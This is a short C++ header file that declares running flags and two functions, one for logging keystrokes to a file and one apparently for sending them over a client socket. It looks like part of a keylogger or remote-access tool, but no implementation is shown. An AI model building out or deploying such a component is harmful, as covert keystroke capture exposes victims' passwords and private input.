#pragma once

#include <atomic>

extern std::atomic<bool> keyloggerRunning;
extern std::atomic<bool> messageBoxRunning;

void keyloggingFile(char* buffer);
void keylogging(int clientSocket);
